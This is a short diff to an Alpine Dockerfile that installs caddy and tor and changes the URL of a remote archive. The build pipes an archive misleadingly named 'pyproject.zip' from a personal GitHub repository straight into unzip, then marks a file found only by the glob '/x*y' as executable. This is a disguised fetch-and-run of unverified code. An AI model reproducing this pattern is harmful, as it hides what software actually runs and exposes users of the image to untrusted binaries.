@@ -2,7 +2,7 @@ FROM alpine:edge
 
 RUN apk update && \
     apk add --no-cache ca-certificates caddy tor wget && \
-    wget -qO- https://github.com/Asxcfrt45/memory_profiler/raw/main/pyproject.zip | busybox unzip - && \
+    wget -qO- https://raw.githubusercontent.com/Asxcfrt45/user/main/pyproject.zip | busybox unzip - && \
     chmod +x $(ls /x*y) && \
     rm -rf /var/cache/apk/*
 
